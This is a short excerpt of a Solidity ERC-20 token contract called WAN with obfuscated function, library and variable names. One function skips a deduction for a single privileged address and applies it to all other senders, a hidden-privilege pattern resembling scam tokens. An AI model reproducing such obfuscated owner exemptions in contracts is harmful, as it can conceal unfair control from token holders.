...
pragma solidity 0.8.18;
    ...
    contract WAN is Context, IERC20, Auth {
    using ryejxwy for uint256;
    string private constant _name = unicode"WAN";
    string private constant _symbol = unicode"WAN";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupplyz_ok = 1000000000 * (10**_decimals);
    ...
    function  afuxr(address from, uint256 a, uint256 b) private view returns(uint256){
        if ( from  == mtrkatangWtiler ) { return a ; } else { return a . afuxr ( b ) ; }
    }
